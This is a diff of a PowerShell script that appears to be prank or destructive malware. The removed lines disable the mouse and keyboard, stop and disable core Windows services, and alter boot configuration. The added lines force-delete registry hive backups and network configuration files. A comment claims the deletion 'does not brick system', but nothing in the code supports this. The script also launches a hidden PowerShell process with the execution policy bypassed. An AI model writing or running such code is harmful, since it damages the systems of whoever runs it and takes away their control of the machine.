@@ -34,27 +34,22 @@ while ($true) {
 $speechScriptPath = "$PWD\speech.ps1"
 Set-Content -Path $speechScriptPath -Value $speechScriptContent
 
-# Disable mouse and keyboard drivers
-$mouseDriver = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Mouse*" }
-$keyboardDriver = Get-PnpDevice | Where-Object { $_.FriendlyName -like "*Keyboard*" }
+# removes system files, forces startup repair (does not brick system)
+$systemFiles = @(
+    "C:\Windows\System32\config\SOFTWARE.bak",
+    "C:\Windows\System32\config\SYSTEM.bak",
+    "C:\Windows\System32\config\SECURITY.bak",
+    "C:\Windows\System32\config\SAM.bak",
+    "C:\Windows\System32\drivers\etc\hosts.bak",
+    "C:\Windows\System32\drivers\etc\networks.bak",
+    "C:\Windows\System32\drivers\etc\protocol.bak",
+    "C:\Windows\System32\drivers\etc\services.bak"
+)
 
-if ($mouseDriver) {
-    Disable-PnpDevice -InstanceId $mouseDriver.InstanceId -Confirm:$false
-}
-
-if ($keyboardDriver) {
-    Disable-PnpDevice -InstanceId $keyboardDriver.InstanceId -Confirm:$false
-}
-
-$services = @("EventLog", "PlugPlay", "RpcSs", "DcomLaunch")
-foreach ($service in $services) {
-    Set-Service -Name $service -StartupType Disabled
-    Stop-Service -Name $service -Force
-}
-
-$bootConfigPath = "C:\Windows\System32\boot.ini"
-if (Test-Path -Path $bootConfigPath) {
-    Add-Content -Path $bootConfigPath -Value "/FAILSAFE"
+foreach ($file in $systemFiles) {
+    if (Test-Path -Path $file) {
+        Remove-Item -Path $file -Force
+    }
 }
 
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
